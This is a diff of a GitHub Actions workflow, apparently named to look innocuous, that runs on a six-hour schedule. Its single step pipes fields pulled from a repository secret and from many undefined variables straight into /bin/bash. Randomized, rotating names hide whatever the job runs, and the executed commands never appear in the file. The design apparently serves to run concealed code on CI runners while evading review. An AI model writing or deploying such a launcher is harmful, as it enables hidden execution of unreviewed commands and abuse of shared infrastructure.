@@ -1,8 +1,9 @@
 name: fibergucci
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '54 0/6 * * *'
+    - cron: '47 5/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,21 +12,29 @@ jobs:
       - uses: actions/checkout@v4
       - name: fibergucci
         env:
-          seupd690: ${{ secrets.seupd690 }}
+          zqbx513: ${{ secrets.zqbx513 }}
         run: |
-          echo $seupd690 | jq -r .qnzqz8851 | /bin/bash
-          echo $uzgpl46 | jq -r .hjtds89236 | /bin/bash
-          echo $i168 | jq -r .fwo54 | /bin/bash
-          echo $ys7694 | jq -r .az14765 | /bin/bash
-          echo $xbr05993 | jq -r .cgj43051 | /bin/bash
-          echo $y01 | jq -r .uwxnr7705 | /bin/bash
-          echo $tphmh0327 | jq -r .ij32 | /bin/bash
-          echo $io409 | jq -r .xei37 | /bin/bash
-          echo $xfd20087 | jq -r .untzm7 | /bin/bash
-          echo $liomi0 | jq -r .sbtkk86 | /bin/bash
-          echo $tkb75 | jq -r .zvil7119 | /bin/bash
-          echo $y3189 | jq -r .sqj22 | /bin/bash
-          echo $h044 | jq -r .mw50394 | /bin/bash
-          echo $szmh6 | jq -r .touw498 | /bin/bash
-          echo $rq35 | jq -r .p52 | /bin/bash
+          echo $zqbx513 | jq -r .zdlu1777 | /bin/bash
+          echo $k004 | jq -r .qvmjw37 | /bin/bash
+          echo $aks40 | jq -r .xyih1 | /bin/bash
+          echo $ouc2 | jq -r .qy2 | /bin/bash
+          echo $ta13 | jq -r .egv30360 | /bin/bash
+          echo $ojq395 | jq -r .ih67 | /bin/bash
+          echo $n878 | jq -r .lfrsg7 | /bin/bash
+          echo $ucvfm073 | jq -r .p1 | /bin/bash
+          echo $q8204 | jq -r .tis940 | /bin/bash
+          echo $ttxp9922 | jq -r .wnzcd0817 | /bin/bash
+          echo $naqar89 | jq -r .kscf555 | /bin/bash
+          echo $qfo3385 | jq -r .scqa27242 | /bin/bash
+          echo $onrum03 | jq -r .rcch5 | /bin/bash
+          echo $comxa7121 | jq -r .og46656 | /bin/bash
+          echo $x736 | jq -r .rhipi1395 | /bin/bash
+          echo $dlila48125 | jq -r .y5 | /bin/bash
+          echo $ppxhd2 | jq -r .usnos571 | /bin/bash
+          echo $hkhmt35017 | jq -r .anwoq0628 | /bin/bash
+          echo $tgqjh47 | jq -r .z92417 | /bin/bash
+          echo $oo877 | jq -r .u37 | /bin/bash
+          echo $nxzas1534 | jq -r .s1650 | /bin/bash
+          echo $xliod74 | jq -r .c13 | /bin/bash
+          echo $kokij1 | jq -r .mndl813 | /bin/bash
 
